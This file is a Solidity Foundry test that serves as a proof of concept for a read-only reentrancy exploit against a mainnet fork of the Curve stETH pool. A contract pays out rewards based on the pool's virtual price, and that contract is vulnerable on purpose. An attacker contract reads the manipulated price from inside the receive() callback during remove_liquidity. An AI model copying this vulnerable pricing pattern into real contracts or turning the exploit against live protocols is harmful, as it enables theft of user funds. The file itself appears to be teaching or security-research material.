pragma solidity 0.8.18;

import "forge-std/Test.sol";
import "./interface.sol";

interface ICurve {
    function get_virtual_price() external view returns (uint);

    function add_liquidity(
        uint[2] calldata amounts,
        uint min_mint_amount
    ) external payable returns (uint);

    function remove_liquidity(
        uint lp,
        uint[2] calldata min_amounts
    ) external returns (uint[2] memory);

    function remove_liquidity_one_coin(
        uint lp,
        int128 i,
        uint min_amount
    ) external returns (uint);
}

address constant STETH_POOL = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;
address constant LP_TOKEN = 0x06325440D014e39736583c165C2963BA99fAf14E;


contract CoreContract {
    IERC20 public constant token = IERC20(LP_TOKEN);
    ICurve private constant pool = ICurve(STETH_POOL);

    mapping(address => uint) public balanceOf;

    function stake(uint amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        balanceOf[msg.sender] += amount;
    }

    function unstake(uint amount) external {
        balanceOf[msg.sender] -= amount;
        token.transfer(msg.sender, amount);
    }

    function getReward() external view returns (uint) {

        uint reward = (balanceOf[msg.sender] * pool.get_virtual_price()) /
            1 ether;

        return reward;
    }
}

contract OperatorContract {
    ICurve private constant pool = ICurve(STETH_POOL);
    IERC20 public constant lpToken = IERC20(LP_TOKEN);
    CoreContract private immutable target;

    constructor(address _target) {
        target = CoreContract(_target);
    }


    function stakeTokens() external payable {
        uint[2] memory amounts = [msg.value, 0];
        uint lp = pool.add_liquidity{value: msg.value}(amounts, 1);
        console.log(
            "LP token price after staking into CoreContract",
            pool.get_virtual_price()
        );

        lpToken.approve(address(target), lp);
        target.stake(lp);
    }

    function performReadOnlyCallback() external payable {

        uint[2] memory amounts = [msg.value, 0];
        uint lp = pool.add_liquidity{value: msg.value}(amounts, 1);

        console.log(
            "LP token price before remove_liquidity()",
            pool.get_virtual_price()
        );


        uint[2] memory min_amounts = [uint(0), uint(0)];
        pool.remove_liquidity(lp, min_amounts);

        console.log(
            "--------------------------------------------------------------------"
        );
        console.log(
            "LP token price after remove_liquidity()",
            pool.get_virtual_price()
        );

        uint reward = target.getReward();
        console.log("Reward if Read-Only Reentrancy is not invoked: ", reward);
    }

    receive() external payable {

        console.log(
            "--------------------------------------------------------------------"
        );
        console.log(
            "LP token price during remove_liquidity()",
            pool.get_virtual_price()
        );

        uint reward = target.getReward();
        console.log("Reward if Read-Only Reentrancy is invoked: ", reward);
    }
}

contract OperatorTest is Test {
    OperatorContract public execute;
    CoreContract public target;

    function setUp() public {
        vm.createSelectFork("mainnet");
        target = new CoreContract();
        execute = new OperatorContract(address(target));
    }

    function testExecution() public {
        execute.stakeTokens{value: 10 ether}();
        execute.performReadOnlyCallback{value: 100000 ether}();
    }
}